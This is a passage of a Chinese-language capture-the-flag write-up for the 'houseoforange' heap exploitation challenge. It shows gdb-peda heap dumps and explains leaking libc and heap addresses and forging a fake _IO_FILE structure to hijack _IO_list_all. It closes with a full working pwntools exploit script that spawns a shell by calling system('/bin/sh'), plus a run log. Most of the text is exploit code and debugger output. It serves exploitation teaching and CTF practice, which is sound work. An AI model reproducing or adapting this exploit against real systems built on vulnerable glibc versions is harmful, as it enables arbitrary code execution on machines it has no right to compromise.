0x5555557580b0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78      <-- fd, bk pointer
0x5555557580c0:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/4gx 0x555555779010-0x10
0x555555779000:	0x0000000000000000	0x0000000000001011  <-- name 2
0x555555779010:	0x0000000a41414141	0x0000000000000000
gdb-peda$ x/4gx 0x555555779010-0x10+0x1010
0x55555577a010:	0x0000000000000000	0x0000000000020ff1  <-- new top chunk
0x55555577a020:	0x0000000000000000	0x0000000000000000
```
可以看到 old top chunk 已经被放到 unsorted bin 中了，其 fd, bk 指针指向 libc。接下来再分配一个 large chunk，这个 chunk 将从 old top chunk 中切下来，剩下的再放回 unsorted bin：
```
gdb-peda$ x/32gx 0x555555758010-0x10
0x555555758000:	0x0000000000000000	0x0000000000000021  <-- house 1
0x555555758010:	0x0000555555758050	0x0000555555758030
0x555555758020:	0x0000000000000000	0x0000000000000021  <-- name 1
0x555555758030:	0x4141414141414141	0x4141414141414141
0x555555758040:	0x4141414141414141	0x4141414141414141  <-- orange 1
0x555555758050:	0x0000001f00000001	0x4141414141414141
0x555555758060:	0x0000000000000000	0x0000000000000021  <-- house 2
0x555555758070:	0x0000555555758090	0x0000555555779010
0x555555758080:	0x0000000000000000	0x0000000000000021  <-- orange 2
0x555555758090:	0x0000001f00000001	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000021  <-- house 3
0x5555557580b0:	0x00005555557584e0	0x00005555557580d0
0x5555557580c0:	0x0000000000000000	0x0000000000000411  <-- name 3
0x5555557580d0:	0x0a41414141414141	0x00007ffff7dd2188
0x5555557580e0:	0x00005555557580c0	0x00005555557580c0
0x5555557580f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/8gx 0x5555557580c0+0x410
0x5555557584d0:	0x0000000000000000	0x0000000000000021  <-- orange 3
0x5555557584e0:	0x0000001f00000001	0x0000000000000000
0x5555557584f0:	0x0000000000000000	0x0000000000000af1  <-- old top chunk
0x555555758500:	0x00007ffff7dd1b78	0x00007ffff7dd1b78      <-- fd, bk pointer
```
可以看到 name 3 上有遗留的 old top chunk 的 bk 指针。只要将其打印出来，通过计算即可得到 libc 的基址。

#### leak heap
```python
def leak_heap():
    global heap_addr

    upgrade(0x10, 'A' * 15)
    heap_addr = u64(see()) - 0xc0       # fd_nextsize pointer

    log.info("heap address: 0x%x" % heap_addr)
```
在上一步中我们还可以看到 name 3 上还有遗留的 fd_nextsize 和 bk_nextsize，这是因为在分配一个 large chunk 时，会先将 unsorted bin 中的 large chunk 取出放到 large bin 中。因为当前 large bin 是空的，所以 chunk 的 fd_nextsize 和 bk_nextsize 都指向自身：
```c
              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                    [...]
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
```
所以这里我们通过修改 name 即可泄露出 heap 地址：
```
gdb-peda$ x/32gx 0x555555758010-0x10
0x555555758000:	0x0000000000000000	0x0000000000000021
0x555555758010:	0x0000555555758050	0x0000555555758030
0x555555758020:	0x0000000000000000	0x0000000000000021
0x555555758030:	0x4141414141414141	0x4141414141414141
0x555555758040:	0x4141414141414141	0x4141414141414141
0x555555758050:	0x0000001f00000001	0x4141414141414141
0x555555758060:	0x0000000000000000	0x0000000000000021
0x555555758070:	0x0000555555758090	0x0000555555779010
0x555555758080:	0x0000000000000000	0x0000000000000021
0x555555758090:	0x0000001f00000001	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000021  <-- house 3
0x5555557580b0:	0x00005555557584e0	0x00005555557580d0
0x5555557580c0:	0x0000000000000000	0x0000000000000411  <-- name 3
0x5555557580d0:	0x4141414141414141	0x0a41414141414141
0x5555557580e0:	0x00005555557580c0	0x00005555557580c0
0x5555557580f0:	0x0000000000000000	0x0000000000000000
```

#### house of orange
```python
def house_of_orange():
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system_addr = libc_base + libc.symbols['system']
    vtable_addr = heap_addr + 0x5c8

    log.info("_IO_list_all address: 0x%x" % io_list_all)
    log.info("system address: 0x%x" % system_addr)
    log.info("vtable address: 0x%x" % vtable_addr)

    stream  = "/bin/sh\x00" + p64(0x60)         # fake header   # fp
    stream += p64(0) + p64(io_list_all - 0x10)  # fake bk pointer
    stream  = stream.ljust(0xa0, '\x00')
    stream += p64(heap_addr + 0x5b8)            # fp->_wide_data
    stream  = stream.ljust(0xc0, '\x00')
    stream += p64(1)                            # fp->_mode

    payload  = "A" * 0x420
    payload += stream
    payload += p64(0) * 2
    payload += p64(vtable_addr)             # _IO_FILE_plus->vtable
    payload += p64(1)                       # fp->_wide_data->_IO_write_base
    payload += p64(2)                       # fp->_wide_data->_IO_write_ptr
    payload += p64(system_addr)             # vtable __overflow

    upgrade(0x600, payload)
```
现在我们有了 libc 和 heap 地址，接下来就是真正的 house-of-orange，相信你已经看了参考章节，这里就不再重复了。结果如下：
```
gdb-peda$ x/36gx 0x5555557580c0+0x410
0x5555557584d0:	0x4141414141414141	0x4141414141414141
0x5555557584e0:	0x0000001f00000001	0x4141414141414141
0x5555557584f0:	0x0068732f6e69622f	0x0000000000000060  <-- _IO_FILE_plus
0x555555758500:	0x0000000000000000	0x00007ffff7dd2510
0x555555758510:	0x0000000000000000	0x0000000000000000
0x555555758520:	0x0000000000000000	0x0000000000000000
0x555555758530:	0x0000000000000000	0x0000000000000000
0x555555758540:	0x0000000000000000	0x0000000000000000
0x555555758550:	0x0000000000000000	0x0000000000000000
0x555555758560:	0x0000000000000000	0x0000000000000000
0x555555758570:	0x0000000000000000	0x0000000000000000
0x555555758580:	0x0000000000000000	0x0000000000000000
0x555555758590:	0x00005555557585b8	0x0000000000000000
0x5555557585a0:	0x0000000000000000	0x0000000000000000
0x5555557585b0:	0x0000000000000001	0x0000000000000000
0x5555557585c0:	0x0000000000000000	0x00005555557585c8  <-- vtable
0x5555557585d0:	0x0000000000000001	0x0000000000000002
0x5555557585e0:	0x00007ffff7a53380	0x000000000000000a
```
可以看到 old top chunk 的 size 被改写为 0x60，在下次分配时，会先从 unsorted bin 中取下 old top chunk，将其放到 smallbins[5]，同时，unsorted bin 的 bk 也将被改写成了 `&IO_list_all-0x10`。

#### pwn
```python
def pwn():
    io.sendlineafter("Your choice : ", '1') # abort routine
    io.interactive()
```
由于不能够通过检查，将触发异常处理过程，`malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp`。

开启 ASLR，Bingo!!!
```
$ python exp.py
[+] Starting local process './houseoforange': pid 6219
[*] libc_base address: 0x7f02ae6d9000
[*] heap address: 0x5575b74a2000
[*] _IO_list_all address: 0x7f02aea9d520
[*] system address: 0x7f02ae71e380
[*] vtable address: 0x5575b74a25c8
[*] Switching to interactive mode
*** Error in `./houseoforange': malloc(): memory corruption: 0x00007f02aea9d520 ***
======= Backtrace: =========
...
$ whoami
firmy
```

#### exploit
完整的 exp 如下：
```python
#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./houseoforange'], env={'LD_PRELOAD':'./libc-2.23.so'})
libc = ELF('libc-2.23.so')

def build(size, name):
    io.sendlineafter("Your choice : ", '1')
    io.sendlineafter("Length of name :", str(size))
    io.sendlineafter("Name :", name)
    io.sendlineafter("Price of Orange:", '1')
    io.sendlineafter("Color of Orange:", '1')

def see():
    io.sendlineafter("Your choice : ", '2')
    data = io.recvuntil('\nPrice', drop=True)[-6:].ljust(8, '\x00')

    return data

def upgrade(size, name):
    io.sendlineafter("Your choice : ", '3')
    io.sendlineafter("Length of name :", str(size))
    io.sendlineafter("Name:", name)
    io.sendlineafter("Price of Orange:", '1')
    io.sendlineafter("Color of Orange:", '1')

def overwrite_top():
    build(0x10, 'AAAA')

    payload  = "A" * 0x30
    payload += p64(0) + p64(0xfa1)      # top chunk header
    upgrade(0x41, payload)

def leak_libc():
    global libc_base

    build(0x1000, 'AAAA')               # _int_free in sysmalloc

    build(0x400, 'A' * 7)               # large chunk
    libc_base = u64(see()) - 0x3c4188   # fd pointer

    log.info("libc_base address: 0x%x" % libc_base)

def leak_heap():
    global heap_addr

    upgrade(0x10, 'A' * 15)
    heap_addr = u64(see()) - 0xc0       # fd_nextsize pointer

    log.info("heap address: 0x%x" % heap_addr)

def house_of_orange():
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system_addr = libc_base + libc.symbols['system']
    vtable_addr = heap_addr + 0x5c8

    log.info("_IO_list_all address: 0x%x" % io_list_all)
    log.info("system address: 0x%x" % system_addr)
    log.info("vtable address: 0x%x" % vtable_addr)

    stream  = "/bin/sh\x00" + p64(0x61)         # fake header   # fp
    stream += p64(0) + p64(io_list_all - 0x10)  # fake bk pointer
    stream  = stream.ljust(0xa0, '\x00')
    stream += p64(heap_addr + 0x5b8)            # fp->_wide_data
    stream  = stream.ljust(0xc0, '\x00')
    stream += p64(1)                            # fp->_mode

    payload  = "A" * 0x420
    payload += stream
    payload += p64(0) * 2
    payload += p64(vtable_addr)             # _IO_FILE_plus->vtable
    payload += p64(1)                       # fp->_wide_data->_IO_write_base
    payload += p64(2)                       # fp->_wide_data->_IO_write_ptr
    payload += p64(system_addr)             # vtable __overflow

    upgrade(0x600, payload)

def pwn():
    io.sendlineafter("Your choice : ", '1') # abort routine
    io.interactive()

if __name__ == '__main__':
    overwrite_top()
    leak_libc()
    leak_heap()
    house_of_orange()
    pwn()
```


## 参考资料
- https://ctftime.org/task/4811
